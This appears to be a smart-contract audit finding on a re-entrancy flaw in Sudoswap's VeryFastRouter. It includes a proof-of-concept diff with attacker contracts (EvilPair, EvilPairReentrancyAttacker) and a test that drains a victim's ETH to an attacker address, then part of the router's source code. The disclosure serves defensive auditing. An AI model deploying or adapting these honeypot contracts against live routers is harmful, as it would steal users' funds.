{
  "Title": "Malicious pair can re-enter `VeryFastRouter` to drain original caller's funds",
  "Content": "**Description:**\n[`VeryFastRouter::swap`](https://github.com/sudoswap/lssvm2/blob/78d38753b2042d7813132f26e5573c6699b605ef/src/VeryFastRouter.sol#L266) is the main entry point for a user to perform a batch of sell and buy orders on the new Sudoswap router, allowing partial fill conditions to be specified. Sell orders are executed first, followed by buy orders. The `LSSVMPair` contracts themselves are implemented in such a way that re-entrancy is not possible, but the same is not true of the `VeryFastRouter`. Assuming a user calls `VeryFastRouter::swap`, selling some NFTs and passing in some additional ETH value for subsequent buy orders, an attacker can re-enter this function under certain conditions to steal the original caller's funds. Given that this function does not check whether the user input contains valid pairs, an attacker can use this to manipulate the return values of `LSSVMPair::swapNFTsForToken` and `LSSVMPair::swapTokenForSpecificNFTs`, which interferes with internal accounting. In this way, the attacker can make it appear that a buy/sell order input/output more/less value than expected.\n\nConsider the case where the attacker is a malicious royalty recipient, and their re-entrant swap order contains a single sell order and an empty array of buy orders. Calling out to their malicious pair gives control over the [`outputAmount`](https://github.com/sudoswap/lssvm2/blob/78d38753b2042d7813132f26e5573c6699b605ef/src/VeryFastRouter.sol#L296) value which is used in addition assignment to the [virtual balance](https://github.com/sudoswap/lssvm2/blob/78d38753b2042d7813132f26e5573c6699b605ef/src/VeryFastRouter.sol#L301-L302) `ethAmount` used to [transfer any remaining ETH](https://github.com/sudoswap/lssvm2/blob/78d38753b2042d7813132f26e5573c6699b605ef/src/VeryFastRouter.sol#L482-L486) after all orders have been executed, filled partially or otherwise. The current contract balance is the original caller's remaining ETH value, so the attacker would intend to have their malicious pair return this amount to drain the funds. However, without the introduction of a malicious pair contract to both the attacker's re-entrant order and the original caller's order, the attacker is prevented from stealing the remaining intermediate funds due to the safe ETH transfer of `ethAmount` as this will cause the original caller's transaction to revert at this same line - the contract is attempting to transfer balance that it no longer has. If this had instead been a transfer of the contract balance directly rather than a virtual balance, then the attacker could succeed in stealing the user's funds without baiting them into making a call to their malicious pair. Of course, calling a malicious pair allows it to steal any funds sent with the call, but given that this can manipulate internal accounting through an incorrect return value, as described above, calling this pair can impact other swap orders/partial fills, tricking the contract into thinking it has fewer funds than it does during the lifetime of the original caller's transaction such that the attacker can re-enter and make away with their ETH. Otherwise, the extent of this vulnerability is a DoS attack on calls to the router.\n\nThe steps to perform this exploit are as follows:\n\n* Trick the caller into including an order on the attacker's malicious pair.\n* The attacker re-enters, passing an order of sell orders and calling back to their malicious pair contract due to unvalidated user input. This inflates the `outputAmount`, which in turn inflates the `ethAmount` for their call.\n* Excess ETH is sent to the attacker.\n* The malicious pair manipulates `ethAmount` by returning a large `inputAmount`.\n* Original caller has any additional partial buy orders fail to fill and receives no ETH in return for selling their NFTs.\n\nThe second exploit case is where the caller specifies the router contract as their token recipient, performing DIY recycle ETH functionality of sorts for subsequent buy orders, likely with zero input `msg.value`. This would allow an attacker to steal intermediate balances by re-entering the final sell order before any funds are consumed by buy orders, as these funds are not tracked by `ethAmount`, and so the final transfer will not revert. Independent of a malicious royalty recipient, this also means that any excess ETH sent not consumed by subsequent buy orders will remain locked in the contract if the caller specifies the router contract as their token recipient. Pool funds are safe due to the use of the factory re-entrancy guard, which prohibits calling into any of the pair swap functions that are responsible for transfers to the router. ETH value sent with ERC-20-based swaps due to user misconfiguration is also vulnerable in the case of malicious royalty recipient.\n\n**Proof of Concept:**\nThe following diff demonstrates a honeypot pair which re-enters the swap and drains the original caller's ETH:\n\n```diff\ndiff --git a/src/VeryFastRouter.sol b/src/VeryFastRouter.sol\nindex 16047b9..2bd3797 100644\n--- a/src/VeryFastRouter.sol\n+++ b/src/VeryFastRouter.sol\n@@ -85,6 +85,7 @@ contract VeryFastRouter {\n     error VeryFastRouter__InvalidPair();\n     error VeryFastRouter__BondingCurveQuoteError();\n\n+   event vfr_log_named_uint         (string key, uint val);\n     constructor(ILSSVMPairFactoryLike _factory) {\n         factory = _factory;\n     }\n@@ -403,12 +404,12 @@ contract VeryFastRouter {\n\n                 // Deduct ETH amount if it's an ETH swap\n                 if (order.ethAmount != 0) {\n-                    console.log(\"deducting eth amount\");\n-                    console.log(\"before: %s\", ethAmount);\n+                    // console.log(\"deducting eth amount\");\n+                    // console.log(\"before: %s\", ethAmount);\n                     ethAmount -= inputAmount;\n-                    console.log(\"after: %s\", ethAmount);\n-                    console.log(\"router balance: %s\", address(this).balance);\n-                    console.log(\"sender balance: %s\", msg.sender.balance);\n+                    // console.log(\"after: %s\", ethAmount);\n+                    // console.log(\"router balance: %s\", address(this).balance);\n+                    // console.log(\"sender balance: %s\", msg.sender.balance);\n                 }\n             }\n             // Otherwise, we need to do some partial fill calculations first\n@@ -488,10 +489,15 @@ contract VeryFastRouter {\n         }\n\n         // Send excess ETH back to token recipient\n-        console.log(\"ethAmount: %s\", ethAmount);\n+        emit vfr_log_named_uint(\"eth Amount\", ethAmount);\n+        emit vfr_log_named_uint(\"pair balance before\", address(this).balance);\n+        if(address(this).balance > ethAmount){\n+            emit vfr_log_named_uint(\"pair balance after\", address(this).balance - ethAmount);\n+        }\n+        else{\n+            emit vfr_log_named_uint(\"pair balance after\", 0);\n+        }\n         if (ethAmount != 0) {\n-            console.log(\"balance: %s\", address(this).balance);\n-            console.log(\"transfering %s ETH to: %s\", ethAmount, swapOrder.tokenRecipient);\n             payable(swapOrder.tokenRecipient).safeTransferETH(ethAmount); // @audit-ok - doesn't seem to be a case when this is less than the actual amount to refund\n         }\n     }\ndiff --git a/src/test/base/VeryFastRouterAllSwapTypes.sol b/src/test/base/VeryFastRouterAllSwapTypes.sol\nindex 9909271..6294bd2 100644\n--- a/src/test/base/VeryFastRouterAllSwapTypes.sol\n+++ b/src/test/base/VeryFastRouterAllSwapTypes.sol\n@@ -33,6 +33,9 @@ import {RoyaltyEngine} from \"../../RoyaltyEngine.sol\";\n import {VeryFastRouter} from \"../../VeryFastRouter.sol\";\n import {LSSVMPairFactory} from \"../../LSSVMPairFactory.sol\";\n\n+import {EvilPair} from \"../mixins/EvilPair.sol\";\n+import {EvilPairReentrancyAttacker} from \"../mixins/EvilPairReentrancyAttacker.sol\";\n+\n abstract contract VeryFastRouterAllSwapTypes is Test, ERC721Holder, ERC1155Holder, ConfigurableWithRoyalties {\n     ICurve bondingCurve;\n     RoyaltyEngine royaltyEngine;\n@@ -43,6 +46,8 @@ abstract contract VeryFastRouterAllSwapTypes is Test, ERC721Holder, ERC1155Holde\n     address constant ROUTER_CALLER = address(1);\n     address constant TOKEN_RECIPIENT = address(420);\n     address constant NFT_RECIPIENT = address(0x69);\n+    address constant PWNER = payable(address(999));\n+    address constant ALICE = payable(address(666));\n\n     uint256 constant START_INDEX = 0;\n     uint256 constant NUM_BEFORE_PARTIAL_FILL = 2;\n@@ -1286,4 +1291,87 @@ abstract contract VeryFastRouterAllSwapTypes is Test, ERC721Holder, ERC1155Holde\n         }\n         vm.stopPrank();\n     }\n+\n+    function testSwapEvilPairReentrancyAttack_audit() public {\n+        EvilPair evilPair;\n+        EvilPairReentrancyAttacker evilPairReentrancyAttacker;\n+        uint256 totalEthToSend = 100 ether;\n+        deal(ALICE, totalEthToSend);\n+\n+        //0. create a pair with a bonding curve\n+        uint256[] memory nftIds;\n+        LSSVMPair pair;\n+        nftIds = _getArray(START_INDEX, END_INDEX);\n+\n+        // mints END_INDEX - START_INDEX + 1 NFTs\n+        pair = setUpPairERC721ForSale(0, address(0), nftIds);\n+\n+        (uint256 delta, uint256 spotPrice) = getReasonableDeltaAndSpotPrice();\n+\n+\n+        //1. create a honeypotNft that again mints END_INDEX - START_INDEX + 1 nfts\n+        IERC721Mintable honeypotNft = _setUpERC721(address(this), address(this), ALICE);\n+\n+        //2. setup a evilPair & transfer above NFTs to the evilPair\n+        evilPair = new EvilPair(spotPrice, delta, address(pair.bondingCurve()), payable(address(0)), address(honeypotNft));\n+        for (uint256 j; j< nftIds.length; j++){\n+            IERC721(honeypotNft).transferFrom(address(this), address(evilPair), nftIds[j]);\n+        }\n+\n+        // 3. setup evil pair attacker\n+        evilPairReentrancyAttacker = new EvilPairReentrancyAttacker(router, spotPrice, PWNER, address(evilPair));\n+\n+        //4. set the evil pair attacker address as above\n+        evilPair.setAttacker(payable(evilPairReentrancyAttacker));\n+        evilPair.setReentrancyAttack(true); // just a flag to change the logic of setReentrancyAttack and swapNFTsForToken\n+        evilPair.setRouterAddress(payable(router));\n+        uint256[] memory partialFillAmounts = new uint256[](0);\n+\n+        //5. create a buy order so that we can re-enter from swapTokenForSpecificNFTs\n+        VeryFastRouter.BuyOrderWithPartialFill memory attackBuyOrder = VeryFastRouter.BuyOrderWithPartialFill({\n+            pair: LSSVMPair(address(evilPair)),\n+            maxInputAmount: totalEthToSend,\n+            ethAmount:totalEthToSend,\n+            nftIds: nftIds,\n+            expectedSpotPrice: pair.spotPrice(),\n+            isERC721: true,\n+            maxCostPerNumNFTs: partialFillAmounts\n+        });\n+\n+       VeryFastRouter.BuyOrderWithPartialFill[] memory buyOrders =\n+            new VeryFastRouter.BuyOrderWithPartialFill[](1);\n+        buyOrders[0] = attackBuyOrder;\n+\n+        //6. Create a dummy sell order - 0 array\n+        VeryFastRouter.SellOrderWithPartialFill[] memory sellOrders =\n+            new VeryFastRouter.SellOrderWithPartialFill[](0);\n+\n+        //7. Create a swap order\n+         VeryFastRouter.Order memory swapOrder = VeryFastRouter.Order({\n+            buyOrders: buyOrders,\n+            sellOrders: sellOrders,\n+            tokenRecipient: payable(TOKEN_RECIPIENT),\n+            nftRecipient: NFT_RECIPIENT,\n+            recycleETH: true\n+        });\n+\n+        //8. We calculate the price of purchasing ALL NFTs from evil pair for given bonding curve\n+        // ignore royalties for this calculation\n+        // initial balance of ALICE (100 ether) - input Amount should be the final balance in ALICE account after swap\n+        // by re-entering and placing a fake buy txn, we can drain all of ALICE's eth\n+        (, , , uint256 inputAmount, ,) = ICurve(pair.bondingCurve()).getBuyInfo(uint128(spotPrice), uint128(delta), nftIds.length, 0, 0);\n+\n+        emit log_named_uint(\"input amount to purchase all NFTs \", inputAmount);\n+        emit log_named_uint(\"Balance in Alice Account Before \", ALICE.balance);\n+        emit log_named_uint(\"Balance in Pwner Account Before \", PWNER.balance);\n+        emit log_named_uint(\"Balance in Router Account Before \", address(router).balance);\n+\n+        // 8. Perform the swap\n+        vm.prank(ALICE);\n+        router.swap{value: totalEthToSend}(swapOrder);\n+\n+        emit log_named_uint(\"Balance in Alice Account After \", ALICE.balance);\n+        emit log_named_uint(\"Balance in Pwner Account After \", PWNER.balance);\n+        emit log_named_uint(\"Balance in Router Account After \", address(router).balance);\n+    }\n }\ndiff --git a/src/test/mixins/EvilPair.sol b/src/test/mixins/EvilPair.sol\nnew file mode 100644\nindex 0000000..8a8ad6d\n--- /dev/null\n+++ b/src/test/mixins/EvilPair.sol\n@@ -0,0 +1,119 @@\n+// SPDX-License-Identifier: AGPL-3.0\n+pragma solidity ^0.8.0;\n+\n+import {console} from \"forge-std/Test.sol\";\n+import {EvilPairReentrancyAttacker} from \"./EvilPairReentrancyAttacker.sol\";\n+import {IERC721} from \"@openzeppelin/contracts/token/ERC721/IERC721.sol\";\n+import {ICurve} from \"../../bonding-curves/ICurve.sol\";\n+\n+contract EvilPair {\n+    uint256 expectedSpotPrice;\n+    uint256 expectedDelta;\n+    address public bondingCurve;\n+    address payable attacker;\n+    uint256 counter;\n+    uint256 inputAmount;\n+    address nftAddress;\n+    address payable routerAddress;\n+    bool isReentrancyAttack;\n+\n+   event evilpair_log_named_uint         (string key, uint val);\n+   event evilpair_log_named_address      (string key, address val);\n+\n+    constructor(uint256 _expectedSpotPrice, uint256 _delta, address _bondingCurve, address payable _attacker, address _nft) {\n+        expectedSpotPrice = _expectedSpotPrice;\n+        expectedDelta = _delta;\n+        bondingCurve = _bondingCurve;\n+        attacker = _attacker;\n+        nftAddress = _nft;\n+    }\n+\n+    function setAttacker(address payable _attacker) public {\n+        attacker = _attacker;\n+    }\n+\n+    function setReentrancyAttack(bool _isAttack) public{\n+        isReentrancyAttack = _isAttack;\n+    }\n+\n+    function setRouterAddress(address payable _router) public{\n+        routerAddress = _router;\n+    }\n+\n+    function swapNFTsForToken(\n+        uint256[] calldata nftIds,\n+        uint256 minExpectedTokenOutput,\n+        address payable tokenRecipient,\n+        bool isRouter,\n+        address routerCaller\n+    ) external virtual returns (uint256) {\n+        if(isReentrancyAttack){\n+            //calculate price of original purchase of user\n+            //reserve that amount of eth for original buy txn to go through\n+            // and drain the balance funds\n+\n+            // reserveAmount of eth calculation\n+            uint256 numNfts = IERC721(nftAddress).balanceOf(address(this));\n+            (, , , uint256 inputAmount, ,) = ICurve(bondingCurve).getBuyInfo(uint128(expectedSpotPrice), uint128(expectedDelta), numNfts, 0, 0);\n+            emit evilpair_log_named_uint(\"input amount inside swapNFTForToken \", inputAmount);\n+            emit evilpair_log_named_uint(\"balance eth in evilPair currently \", address(this).balance);\n+\n+\n+            // we ignore royalties for this\n+            if(address(this).balance > inputAmount){\n+                uint256 splitPayment = (address(this).balance - inputAmount)*50/100;\n+                //transfer 50% to the router to enable a payoff\n+                (bool success, ) = address(routerAddress).call{value: splitPayment}(\"\");\n+                return splitPayment;\n+            }\n+            return 0;\n+        }\n+\n+    }\n+\n+    function swapTokenForSpecificNFTs(\n+        uint256[] calldata nftIds,\n+        uint256 maxExpectedTokenInput,\n+        address nftRecipient,\n+        bool isRouter,\n+        address routerCaller\n+    ) external payable virtual returns (uint256) {\n+        uint256 ethAmount = msg.value;\n+        if(isReentrancyAttack){\n+            EvilPairReentrancyAttacker(attacker).attack();\n+\n+        }\n+        else{\n+            sweepETH();\n+        }\n+\n+        return ethAmount;\n+    }\n+\n+    function sweepETH() public {\n+        (bool success, ) = attacker.call{value: address(this).balance}(\"\");\n+        require(success, \"eth sweep success\");\n+    }\n+\n+    function spotPrice() external view virtual returns (uint256) {\n+        return expectedSpotPrice;\n+    }\n+\n+    function delta() external view virtual returns (uint256) {\n+        return expectedDelta;\n+    }\n+\n+    function fee() external view virtual returns (uint256) {\n+        return 0;\n+    }\n+\n+    function nft() external view virtual returns (address) {\n+        return nftAddress;\n+    }\n+\n+    function calculateRoyaltiesView(uint256 assetId, uint256 saleAmount)\n+        public\n+        view\n+        returns (address payable[] memory royaltyRecipients, uint256[] memory royaltyAmounts, uint256 royaltyTotal)\n+    {}\n+}\n\\ No newline at end of file\ndiff --git a/src/test/mixins/EvilPairReentrancyAttacker.sol b/src/test/mixins/EvilPairReentrancyAttacker.sol\nnew file mode 100644\nindex 0000000..019019f\n--- /dev/null\n+++ b/src/test/mixins/EvilPairReentrancyAttacker.sol\n@@ -0,0 +1,79 @@\n+// SPDX-License-Identifier: AGPL-3.0\n+pragma solidity ^0.8.0;\n+\n+import {LSSVMPair} from \"../../LSSVMPair.sol\";\n+import {VeryFastRouter} from \"../../VeryFastRouter.sol\";\n+\n+import {console} from \"forge-std/Test.sol\";\n+\n+contract EvilPairReentrancyAttacker {\n+    VeryFastRouter immutable internal router;\n+    uint256 immutable internal expectedSpotPrice;\n+    address immutable internal PWNER;\n+    address immutable internal evilPair;\n+    uint256 counter;\n+\n+    constructor(VeryFastRouter _router, uint256 _expectedSpotPrice, address _pwner, address _evilPair) {\n+        router = _router;\n+        expectedSpotPrice = _expectedSpotPrice;\n+        PWNER = _pwner;\n+        evilPair = _evilPair;\n+    }\n+\n+    fallback() external payable {\n+        // console.log(\"entered fallback\");\n+        // if (msg.sig == this.attack.selector) {\n+        //     console.log(\"doing attack\");\n+        //     attack();\n+        //     return;\n+        // }\n+        // if (++counter == 2) {\n+        //     console.log(\"doing attack\");\n+        //     attack();\n+        // } else {\n+        //     console.log(\"doing nothing\");\n+        //     return;\n+        // }\n+    }\n+\n+    receive() external payable {}\n+\n+    function attack() public {\n+        console.log(\"executing attack\");\n+        VeryFastRouter.BuyOrderWithPartialFill[] memory attackBuyOrders = new VeryFastRouter.BuyOrderWithPartialFill[](0);\n+        VeryFastRouter.SellOrderWithPartialFill[] memory attackSellOrders = new VeryFastRouter.SellOrderWithPartialFill[](1);\n+        uint256[] memory nftInfo = new uint256[](1);\n+        nftInfo[0] = 1337;\n+        uint256[] memory empty = new uint256[](0);\n+\n+        attackSellOrders[0] = VeryFastRouter.SellOrderWithPartialFill({\n+            pair: LSSVMPair(evilPair),\n+            isETHSell: true,\n+            isERC721: true,\n+            nftIds: nftInfo,\n+            doPropertyCheck: false,\n+            propertyCheckParams: \"\",\n+            expectedSpotPrice: expectedSpotPrice < type(uint128).max ? uint128(expectedSpotPrice) : type(uint128).max,\n+            minExpectedOutput: 0,\n+            minExpectedOutputPerNumNFTs: empty\n+        });\n+\n+        VeryFastRouter.Order memory attackSwapOrder = VeryFastRouter.Order({\n+            buyOrders: attackBuyOrders,\n+            sellOrders: attackSellOrders,\n+            tokenRecipient: payable(PWNER),\n+            nftRecipient: PWNER,\n+            recycleETH: true\n+        });\n+\n+\n+        router.swap(attackSwapOrder);\n+\n+        console.log(\"completed attack\");\n+    }\n+\n+    function sweepETH() public {\n+        (bool success, ) = PWNER.call{value: address(this).balance}(\"\");\n+        require(success, \"sweep eth failed\");\n+    }\n+}\n\\ No newline at end of file\n```\n\n**Impact:**\nThis vulnerability results in the loss of user funds, with high impact and medium likelihood, so we evaluate the severity to HIGH.\n\n**Recommended Mitigation:**\nValidate user inputs to `VeryFastRouter::swap`, in particular pairs, and consider making this function non-reentrant.\n\n**Sudoswap:**\nAcknowledged, no change for now as risk surface is set to callers passing in improper arguments. Pair validation is done client-side, so less of a concern.\n\n**Cyfrin:**\nAcknowledged.",
  "Impact": "HIGH",
  "Source": "",
  "Code": [
    {
      "filename": "src/VeryFastRouter.sol",
      "content": "// SPDX-License-Identifier: AGPL-3.0\npragma solidity ^0.8.0;\n\nimport {ERC20} from \"solmate/tokens/ERC20.sol\";\nimport {SafeTransferLib} from \"solmate/utils/SafeTransferLib.sol\";\n\nimport {IERC721} from \"@openzeppelin/contracts/token/ERC721/IERC721.sol\";\nimport {IERC1155} from \"@openzeppelin/contracts/token/ERC1155/IERC1155.sol\";\n\nimport {LSSVMPair} from \"./LSSVMPair.sol\";\nimport {LSSVMPairERC20} from \"./LSSVMPairERC20.sol\";\nimport {ILSSVMPairERC721} from \"./erc721/ILSSVMPairERC721.sol\";\nimport {LSSVMPairERC1155} from \"./erc1155/LSSVMPairERC1155.sol\";\nimport {ILSSVMPairFactoryLike} from \"./ILSSVMPairFactoryLike.sol\";\nimport {CurveErrorCodes} from \"./bonding-curves/CurveErrorCodes.sol\";\n\n/**\n * @dev Full-featured router to handle all swap types, with partial fill support\n */\ncontract VeryFastRouter {\n    using SafeTransferLib for address payable;\n    using SafeTransferLib for ERC20;\n\n    uint256 constant BASE = 1e18;\n\n    ILSSVMPairFactoryLike public immutable factory;\n\n    struct BuyOrderWithPartialFill {\n        LSSVMPair pair;\n        bool isERC721;\n        uint256[] nftIds;\n        uint256 maxInputAmount;\n        uint256 ethAmount;\n        uint256 expectedSpotPrice;\n        uint256[] maxCostPerNumNFTs; // @dev This is zero-indexed, so maxCostPerNumNFTs[x] = max price we're willing to pay to buy x+1 NFTs\n    }\n\n    struct SellOrderWithPartialFill {\n        LSSVMPair pair;\n        bool isETHSell;\n        bool isERC721;\n        uint256[] nftIds;\n        bool doPropertyCheck;\n        bytes propertyCheckParams;\n        uint128 expectedSpotPrice;\n        uint256 minExpectedOutput;\n        uint256[] minExpectedOutputPerNumNFTs;\n    }\n\n    struct Order {\n        BuyOrderWithPartialFill[] buyOrders;\n        SellOrderWithPartialFill[] sellOrders;\n        address payable tokenRecipient;\n        address nftRecipient;\n        bool recycleETH;\n    }\n\n    struct PartialFillSellArgs {\n        LSSVMPair pair;\n        uint128 spotPrice;\n        uint256 maxNumNFTs;\n        uint256[] minOutputPerNumNFTs;\n        uint256 protocolFeeMultiplier;\n        uint256 nftId;\n    }\n\n    struct PartialFillSellHelperArgs {\n        LSSVMPair pair;\n        uint256[] minOutputPerNumNFTs;\n        uint256 protocolFeeMultiplier;\n        uint256 nftId;\n        uint256 start;\n        uint256 end;\n        uint128 delta;\n        uint128 spotPrice;\n        uint256 feeMultiplier;\n        uint256 pairTokenBalance;\n        uint256 royaltyAmount;\n        uint256 numItemsToFill;\n        uint256 priceToFillAt;\n    }\n\n    error VeryFastRouter__InvalidPair();\n    error VeryFastRouter__BondingCurveQuoteError();\n\n    constructor(ILSSVMPairFactoryLike _factory) {\n        factory = _factory;\n    }\n\n    /* @dev Meant to be used as a client-side utility\n     * Given a pair and a number of items to buy, calculate the max price paid for 1 up to numNFTs to buy\n     */\n    function getNFTQuoteForBuyOrderWithPartialFill(\n        LSSVMPair pair,\n        uint256 numNFTs,\n        uint256 slippageScaling,\n        uint256 assetId\n    ) external view returns (uint256[] memory) {\n        uint256[] memory prices = new uint256[](numNFTs);\n\n        for (uint256 i; i < numNFTs;) {\n            uint128 newSpotPrice = pair.spotPrice();\n            uint128 newDelta = pair.delta();\n\n            // Assume that i items have been bought and get the new params\n            if (i != 0) {\n                (newSpotPrice, newDelta) = _getNewPoolParamsAfterBuying(pair, i);\n            }\n\n            // Calculate price to purchase the remaining numNFTs - i items\n            uint256 price = _getHypotheticalNewPoolParamsAfterBuying(pair, newSpotPrice, newDelta, numNFTs - i);\n\n            (,, uint256 royaltyTotal) = pair.calculateRoyaltiesView(assetId, price);\n            price += royaltyTotal;\n\n            // Set the price to buy numNFT - i items\n            prices[numNFTs - i - 1] = price;\n\n            unchecked {\n                ++i;\n            }\n        }\n        // Scale up by slippage amount\n        if (slippageScaling != 0) {\n            for (uint256 i = 0; i < prices.length;) {\n                prices[i] = prices[i] + (prices[i] * slippageScaling / 1e18);\n\n                unchecked {\n                    ++i;\n                }\n            }\n        }\n\n        return prices;\n    }\n\n    function _getNewPoolParamsAfterBuying(LSSVMPair pair, uint256 i)\n        internal\n        view\n        returns (uint128 newSpotPrice, uint128 newDelta)\n    {\n        CurveErrorCodes.Error errorCode;\n        (errorCode, newSpotPrice, newDelta,,,) = pair.bondingCurve().getBuyInfo(\n            pair.spotPrice(), pair.delta(), i, pair.fee(), pair.factory().protocolFeeMultiplier()\n        );\n        if (errorCode != CurveErrorCodes.Error.OK) {\n            revert VeryFastRouter__BondingCurveQuoteError();\n        }\n    }\n\n    function _getHypotheticalNewPoolParamsAfterBuying(\n        LSSVMPair pair,\n        uint128 newSpotPrice,\n        uint128 newDelta,\n        uint256 num\n    ) internal view returns (uint256 output) {\n        CurveErrorCodes.Error errorCode;\n        (errorCode,,, output,,) = pair.bondingCurve().getBuyInfo(\n            newSpotPrice, newDelta, num, pair.fee(), pair.factory().protocolFeeMultiplier()\n        );\n        if (errorCode != CurveErrorCodes.Error.OK) {\n            revert VeryFastRouter__BondingCurveQuoteError();\n        }\n    }\n\n    function getPairBaseQuoteTokenBalance(LSSVMPair pair) public view returns (uint256 balance) {\n        ILSSVMPairFactoryLike.PairVariant variant = pair.pairVariant();\n        if (\n            variant == ILSSVMPairFactoryLike.PairVariant.ERC721_ETH\n                || variant == ILSSVMPairFactoryLike.PairVariant.ERC1155_ETH\n        ) {\n            balance = address(pair).balance;\n        } else {\n            balance = ERC20(LSSVMPairERC20(address(pair)).token()).balanceOf(address(pair));\n        }\n    }\n\n    function _wrapUintAsArray(uint256 valueToWrap) internal pure returns (uint256[] memory) {\n        uint256[] memory arr = new uint256[](1);\n        arr[0] = valueToWrap;\n        return arr;\n    }\n\n    /* @dev Meant to be used as a client-side utility\n     * Given a pair and a number of items to sell, calculate the mininum output for selling 1 to numNFTs\n     */\n    function getNFTQuoteForSellOrderWithPartialFill(\n        LSSVMPair pair,\n        uint256 numNFTs,\n        uint256 slippageScaling,\n        uint256 nftId\n    ) external view returns (uint256[] memory) {\n        uint256[] memory outputAmounts = new uint256[](numNFTs);\n\n        for (uint256 i; i < numNFTs;) {\n            uint128 newSpotPrice = pair.spotPrice();\n            uint128 newDelta = pair.delta();\n\n            // Assume that i items have been sold and get the new params\n            if (i != 0) {\n                (newSpotPrice, newDelta) = _getNewPoolParamsAfterSelling(pair, i);\n            }\n\n            // Calculate output to sell the remaining numNFTs - i items, factoring in royalties\n            uint256 output = _getHypotheticalNewPoolParamsAfterSelling(pair, newSpotPrice, newDelta, numNFTs - i);\n            (,, uint256 royaltyTotal) = pair.calculateRoyaltiesView(nftId, output);\n            output -= royaltyTotal;\n\n            outputAmounts[numNFTs - i - 1] = output;\n\n            unchecked {\n                ++i;\n            }\n        }\n        // Scale down by slippage amount\n        if (slippageScaling != 0) {\n            for (uint256 i = 0; i < outputAmounts.length;) {\n                outputAmounts[i] = outputAmounts[i] - (outputAmounts[i] * slippageScaling / 1e18);\n\n                unchecked {\n                    ++i;\n                }\n            }\n        }\n        return outputAmounts;\n    }\n\n    function _getNewPoolParamsAfterSelling(LSSVMPair pair, uint256 i)\n        internal\n        view\n        returns (uint128 newSpotPrice, uint128 newDelta)\n    {\n        CurveErrorCodes.Error errorCode;\n        (errorCode, newSpotPrice, newDelta,,,) = pair.bondingCurve().getSellInfo(\n            pair.spotPrice(), pair.delta(), i, pair.fee(), pair.factory().protocolFeeMultiplier()\n        );\n        if (errorCode != CurveErrorCodes.Error.OK) {\n            revert VeryFastRouter__BondingCurveQuoteError();\n        }\n    }\n\n    function _getHypotheticalNewPoolParamsAfterSelling(\n        LSSVMPair pair,\n        uint128 newSpotPrice,\n        uint128 newDelta,\n        uint256 num\n    ) internal view returns (uint256 output) {\n        CurveErrorCodes.Error errorCode;\n        (errorCode,,, output,,) = pair.bondingCurve().getSellInfo(\n            newSpotPrice, newDelta, num, pair.fee(), pair.factory().protocolFeeMultiplier()\n        );\n        if (errorCode != CurveErrorCodes.Error.OK) {\n            revert VeryFastRouter__BondingCurveQuoteError();\n        }\n    }\n\n    /**\n     * @dev Performs a batch of sells and buys, avoids performing swaps where the price is beyond\n     * Handles selling NFTs for tokens or ETH\n     * Handles buying NFTs with tokens or ETH,\n     * @param swapOrder The struct containing all the swaps to be executed\n     * @return results Indices [0..swapOrder.sellOrders.length-1] contain the actual output amounts of the\n     * sell orders, indices [swapOrder.sellOrders.length..swapOrder.sellOrders.length+swapOrder.buyOrders.length-1]\n     * contain the actual input amounts of the buy orders.\n     */\n    function swap(Order calldata swapOrder) external payable returns (uint256[] memory results) {\n        uint256 ethAmount = msg.value;\n\n        // Get protocol to reduce gas on the _findMaxFillableAmtForSell/_findMaxFillableAmtForBuy calls\n        uint256 protocolFeeMultiplier = factory.protocolFeeMultiplier();\n\n        results = new uint256[](swapOrder.buyOrders.length + swapOrder.sellOrders.length);\n\n        // Go through each sell order\n        for (uint256 i; i < swapOrder.sellOrders.length;) {\n            SellOrderWithPartialFill calldata order = swapOrder.sellOrders[i];\n            uint128 pairSpotPrice = order.pair.spotPrice();\n            uint256 outputAmount;\n\n            // If the spot price parameter seen is what we expect it to be...\n            if (pairSpotPrice == order.expectedSpotPrice) {\n                // If the pair is an ETH pair and we opt into recycling ETH, add the output to our total accrued\n                if (order.isETHSell && swapOrder.recycleETH) {\n                    // Pass in params for property checking if needed\n                    // Then do the swap with the same minExpectedTokenOutput amount\n                    if (order.doPropertyCheck) {\n                        outputAmount = ILSSVMPairERC721(address(order.pair)).swapNFTsForToken(\n                            order.nftIds,\n                            order.minExpectedOutput,\n                            payable(address(this)),\n                            true,\n                            msg.sender,\n                            order.propertyCheckParams\n                        );\n                    } else {\n                        outputAmount = order.pair.swapNFTsForToken(\n                            order.nftIds, order.minExpectedOutput, payable(address(this)), true, msg.sender\n                        );\n                    }\n\n                    // Accumulate ETH amount\n                    ethAmount += outputAmount;\n                }\n                // Otherwise, all tokens or ETH received from the sale go to the token recipient\n                else {\n                    // Pass in params for property checking if needed\n                    // Then do the swap with the same minExpectedTokenOutput amount\n                    if (order.doPropertyCheck) {\n                        outputAmount = ILSSVMPairERC721(address(order.pair)).swapNFTsForToken(\n                            order.nftIds,\n                            order.minExpectedOutput,\n                            swapOrder.tokenRecipient,\n                            true,\n                            msg.sender,\n                            order.propertyCheckParams\n                        );\n                    } else {\n                        outputAmount = order.pair.swapNFTsForToken(\n                            order.nftIds, order.minExpectedOutput, swapOrder.tokenRecipient, true, msg.sender\n                        );\n                    }\n                }\n            }\n            // Otherwise we need to do some partial fill calculations first\n            else {\n                uint256 numItemsToFill;\n                uint256 priceToFillAt;\n\n                {\n                    // Grab royalty for calc in _findMaxFillableAmtForSell\n                    (,, uint256 royaltyAmount) = order.pair.calculateRoyaltiesView(\n                        order.isERC721 ? order.nftIds[0] : LSSVMPairERC1155(address(order.pair)).nftId(), BASE\n                    );\n\n                    // Calculate the max number of items we can sell\n                    (numItemsToFill, priceToFillAt) = _findMaxFillableAmtForSell(\n                        order.pair,\n                        pairSpotPrice,\n                        order.minExpectedOutputPerNumNFTs,\n                        protocolFeeMultiplier,\n                        royaltyAmount\n                    );\n                }\n\n                // If we can sell at least 1 item...\n                if (numItemsToFill != 0) {\n                    // If property checking is needed, do the property check swap\n                    if (order.doPropertyCheck) {\n                        outputAmount = ILSSVMPairERC721(address(order.pair)).swapNFTsForToken(\n                            order.nftIds[:numItemsToFill],\n                            priceToFillAt,\n                            swapOrder.tokenRecipient,\n                            true,\n                            msg.sender,\n                            order.propertyCheckParams\n                        );\n                    }\n                    // Otherwise do a normal sell swap\n                    else {\n                        // Get subarray if ERC721\n                        if (order.isERC721) {\n                            outputAmount = order.pair.swapNFTsForToken(\n                                order.nftIds[:numItemsToFill], priceToFillAt, swapOrder.tokenRecipient, true, msg.sender\n                            );\n                        }\n                        // For 1155 swaps, wrap as number\n                        else {\n                            outputAmount = order.pair.swapNFTsForToken(\n                                _wrapUintAsArray(numItemsToFill),\n                                